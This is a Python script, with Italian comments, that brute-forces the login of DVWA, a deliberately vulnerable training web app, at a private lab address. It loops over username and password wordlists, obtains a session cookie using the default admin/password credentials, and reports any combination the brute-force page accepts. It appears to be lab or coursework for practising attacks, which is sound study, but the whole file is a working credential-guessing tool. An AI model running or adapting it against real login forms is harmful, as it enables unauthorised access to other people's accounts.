import http.client, urllib.parse

#La funzione main estrare e pulisce i dati dai dictionary
def main():
    lista_username = open("testUsernames.lst")
    lista_password = open("testPasswords.lst")
    ip_target_meta = "192.168.50.101"
    user = lista_username.readlines() 
    password = lista_password.readlines()

#Inizia ad eseguire il ciclo for per provare tutte le combinazioni contenute nei files
    for usr in user:      
        usr = usr.rstrip()
        for pwd in password:
            pwd = pwd.rstrip()
            print(f"Trying username: {usr} and password: {pwd}")
            cookie = get_cookie(ip_target_meta, 'admin', 'password')
            try_login(ip_target_meta, cookie, usr, pwd)

#La funzione serve a richiedere la pagina di login ed estrae il token necessario per accedere
#alla sezione interno di DWVA tramite credenziali note per semplicità, ma può essere utilizzata anche
#per effettuare un attacco Brute Froce
def get_cookie(ip_target_meta, usr, pwd):
    post_parameters = urllib.parse.urlencode({'username': usr, 'password': pwd, 'Login':"Login"})
    headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
    conn = http.client.HTTPConnection(ip_target_meta)
    conn.request("POST", "/dvwa/login.php", post_parameters, headers)
    response = conn.getresponse()
    response.read().decode()
    set_cookie_header = response.getheaders()
    dest_cookie = ''
    for cookie in set_cookie_header:
        if cookie[0] == 'Set-Cookie' and "PHPSESSID" in str(cookie[1]):
            dest_cookie = cookie[1].split(";")[0]
    conn.close()
    return dest_cookie
    #print(dest_cookie)

#La funzione tenta di effettuare il login con una username e password aggiungendo il cookie richiesto e
#e verifica se è presente o meno nella pagina restiuita la frase del login errato
def try_login(ip_target_meta, dest_cookie, usr, pwd):
        conn = http.client.HTTPConnection(ip_target_meta,80)
        post_parameters = urllib.parse.urlencode({'username': usr, 'password': pwd, 'Login':'Login#'}) 
        url_dvwa_bf = '/dvwa/vulnerabilities/brute/'
        url_target = url_dvwa_bf + '?' + post_parameters
        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml", 'Cookie':dest_cookie}  
        conn.request("GET", url_target, post_parameters, headers) 
        response = conn.getresponse()
        page_content = response.read().decode()
        if "Username and/or password incorrect" not in str(page_content):
            lenght = len(f"Logged with: {usr} - {pwd} *")
            frame = lenght * "*"
            print(f"{frame}\nLogged with: {usr} - {pwd} *\n{frame}")
        conn.close()

if __name__ == "__main__":
    main()
